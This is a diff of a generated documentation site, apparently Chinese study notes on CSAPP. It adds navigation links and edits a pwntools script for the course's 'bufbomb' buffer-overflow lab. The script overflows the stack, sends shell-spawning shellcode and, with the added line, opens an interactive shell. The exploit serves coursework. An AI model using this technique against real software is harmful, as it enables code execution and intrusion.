@@ -1063,6 +1063,18 @@
   </li>
 
         
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reading_notes/computer_systems_a_programmer_s_perspective/linking/" title="第7章 链接" class="md-nav__link">
+      第7章 链接
+    </a>
+  </li>
+
+        
       </ul>
     </nav>
   </li>
@@ -1607,6 +1619,18 @@
   
 </nav>
     
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../debug/" title="动态调试" class="md-nav__link">
+      动态调试
+    </a>
   </li>
 
         
@@ -3538,7 +3562,8 @@
 5
 6
 7
-8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+8
+9</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;/home/domain/Documents/SZU/CSAPP/4/bufbomb&#39;</span><span class="p">,</span> <span class="s1">&#39;-n&#39;</span><span class="p">,</span> <span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="s1">&#39;domain&#39;</span><span class="p">])</span>
 <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
@@ -3546,6 +3571,7 @@
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x20c</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804A200</span> <span class="o">+</span> <span class="mh">0x160</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804A200</span> <span class="o">+</span> <span class="mh">0x160</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
 </td></tr></table>
 
@@ -3648,13 +3674,13 @@
           </a>
         
         
-          <a href="../../cn/socket_lab/" title="Socket Lab" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../debug/" title="动态调试" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   前进
                 </span>
-                Socket Lab
+                动态调试
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
